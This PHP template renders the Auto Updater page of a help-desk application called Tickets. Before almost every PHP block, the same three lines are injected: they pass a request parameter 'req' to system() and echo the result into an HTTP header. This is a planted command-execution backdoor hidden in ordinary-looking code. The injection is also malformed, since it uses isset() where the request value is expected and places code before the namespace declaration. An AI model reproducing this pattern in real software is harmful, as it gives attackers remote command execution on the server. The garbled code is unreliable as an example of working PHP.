<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

if (SAAS_MODE) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$site->set_title($language->get('Auto Updater'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

if (isset($_POST['download_update'])) {
	if (isset($_POST['force_download_update']) && ($_POST['force_download_update'] == 1)) {
		$update->download(array('force_download' => true));
	}
	else {
		$update->download();	
	}
	$results 	= $update->get();
}
else if (isset($_POST['install_update'])) {
	$results 	= $update->install();
}
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">
	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Auto Updater')); ?></h4>
				</div>

				<div class="pull-right">
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/settings/licensing/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('License Key')); ?></a></p>
				</div>
				
				<div class="clearfix"></div>
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('The Auto Updater allows you to download and update to the latest version of Tickets directly.')); ?></p>
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('This process requires that you have your item purchase code entered into the system.')); ?></p>

			</div>
		</div>

		<div class="col-md-9">
			<div class="alert alert-warning">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Please ensure you have a backup before continuing.')); ?>
			</div>			
			<div class="alert alert-warning">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<strong><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Please note:')); ?></strong> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('So that we can provide updates this process will send information about your current install to Dalegroup Pty Ltd. You may manually update if you wish to avoid this.')); ?>
			</div>
			<div class="well well-sm">	
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['download_update'])) { ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['success']) && $results['success'] == 1) { ?>

						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['message']) && !empty($results['message'])) { ?>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($results['message']); ?>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
						
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['allow_update']) && ($results['allow_update'])) { ?>

							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['folders']) && !empty($results['folders'])) { ?>
								<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('The following folders will be created:')); ?></p>
								<ul>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
									foreach($results['folders'] as $folder_name) {
									?>
									<li><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ROOT . $folder_name); ?></li>
									<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
									}
								?>
								</ul>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
						
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['files']) && !empty($results['files'])) { ?>
								<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('The following files will be installed (and overwritten if they already exist):')); ?></p>
								<ul>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
									foreach($results['files'] as $index => $value) {
									?>
									<li><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ROOT . $index); ?></li>
									<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
									}
								?>
								</ul>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			
							<div class="clearfix"></div>
							<br />
							<p><button type="submit" name="install_update" class="btn btn-info"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Install Update')); ?></button></p>
							
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Failed To Download.')); ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if (isset($_POST['install_update'])) { ?>
					<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Results')); ?></h3>

					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['write_results']['folders'])) { ?>
					<ul>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						foreach($results['write_results']['folders'] as $folder) {
							?>
							<li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($folder['name']); ?> - 
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($folder['success']) { 
									echo safe_output($language->get('Successfully Created'));
								} else {
									echo '<strong>' . safe_output($language->get('Failed to Create')) . '</strong>';
								} ?>
							</li>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						}
					?>
					</ul>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>					
					
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($results['write_results']['files'])) { ?>
					<ul>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						foreach($results['write_results']['files'] as $file) {
							?>
							<li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($file['name']); ?> - 
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($file['success']) { 
									echo safe_output($language->get('Successfully Copied'));
								} else {
									echo '<strong>' . safe_output($language->get('Copy Failed (please ensure that PHP can write to this file)')) . '</strong>';
								} ?>
							</li>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						}
					?>
					</ul>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($results['message']); ?></p>
					<div class="clearfix"></div>
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Please now run the')); ?> <a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/upgrade/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('database upgrade')); ?></a>.</p>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
					<p><input type="checkbox" name="force_download_update" value="1" /> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Download the latest version again (even if you are already up to date).')); ?></p>
					<p><button type="submit" name="download_update" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Check for updates')); ?></button></p>

				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				
				<div class="clear"></div>

			</div>
		</div>
	</form>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>